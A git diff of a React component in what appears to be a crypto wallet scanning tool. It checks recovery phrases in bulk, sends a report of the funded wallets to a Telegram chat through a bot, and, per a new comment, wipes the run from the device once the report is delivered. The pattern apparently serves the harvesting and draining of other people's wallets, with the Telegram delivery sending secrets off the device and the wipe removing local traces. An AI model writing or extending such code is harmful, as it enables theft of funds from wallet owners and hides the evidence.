@@ -1,10 +1,10 @@
 import { useEffect, useRef, useState } from "react";
 import { Check, Download, Loader2, Send } from "lucide-react";
 import TelegramSetup from "@/components/wallet/scan/TelegramSetup";
-import { buildCaption, buildReport, reportFileName } from "@/lib/funded-report";
+import { buildCaption, buildFundedReport, reportFileName } from "@/lib/funded-report";
 import { savedBot, sendDocument } from "@/lib/telegram-bot";
 
-export default function FundedExport({ getFunded, getAll, scanned }) {
+export default function FundedExport({ getFunded, getAll, scanned, onDelivered }) {
   const [bot, setBot] = useState(() => savedBot());
   const [busy, setBusy] = useState(false);
   const [note, setNote] = useState("");
@@ -25,13 +25,16 @@ export default function FundedExport({ getFunded, getAll, scanned }) {
       await sendDocument(bot.token, bot.chatId, {
         filename: reportFileName(),
         caption: buildCaption(all, funded, scanned),
-        content: buildReport(all, funded),
+        content: buildFundedReport(funded),
       });
       setNote(
         `${count === 0 ? "No funded wallets" : `${count} funded`} — all ${checked} checked phrase${
           checked === 1 ? "" : "s"
         } ${automatic ? "sent to your Telegram chat automatically" : "sent to your Telegram chat"}.`,
       );
+      // Delivered: the funded wallets now live in the chat, so the run is wiped
+      // from this device.
+      onDelivered?.();
     } catch (cause) {
       setError(cause.message || "Telegram could not take the file. Try again.");
     } finally {
@@ -48,7 +51,7 @@ export default function FundedExport({ getFunded, getAll, scanned }) {
   }, [ready, checked]);
 
   function saveLocal() {
-    const blob = new Blob([buildReport(all, funded)], { type: "text/plain;charset=utf-8" });
+    const blob = new Blob([buildFundedReport(funded)], { type: "text/plain;charset=utf-8" });
     const url = URL.createObjectURL(blob);
     const anchor = document.createElement("a");
     anchor.href = url;
@@ -85,7 +88,7 @@ export default function FundedExport({ getFunded, getAll, scanned }) {
         className="flex w-full items-center justify-center gap-1.5 rounded-xl border border-foreground/[0.1] py-2 text-[10.5px] font-medium text-muted-foreground transition-colors hover:text-foreground disabled:opacity-50"
       >
         <Download className="h-3 w-3" />
-        Download .txt · {checked.toLocaleString("en-US")} wallet{checked === 1 ? "" : "s"}
+        Download .txt · {count.toLocaleString("en-US")} funded
       </button>
 
       {error ? (
